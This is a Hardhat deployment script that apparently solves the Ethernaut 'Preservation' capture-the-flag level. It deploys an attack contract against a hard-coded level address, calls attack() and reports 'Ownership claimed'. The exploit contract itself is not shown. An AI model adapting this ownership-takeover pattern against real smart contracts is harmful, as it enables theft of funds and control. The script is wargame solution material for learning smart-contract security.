const hre = require('hardhat');

async function main() {
  // Ethernaut level
  const preservationContract = '0x667f887b4a35D976D1F24d225eE3A65E5210eC9a';
  const [deployer] = await ethers.getSigners();

  console.log('Deploying contracts with the account:', deployer.address);
  console.log('Account balance:', (await deployer.getBalance()).toString());

  const PreservationSolution = await ethers.getContractFactory('PreservationSolution', deployer);
  const preservationSolution = await PreservationSolution.deploy(preservationContract);

  const tx = await preservationSolution.attack({ gasLimit: 50000 });
  await tx.wait();

  console.log('Ownership claimed');
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
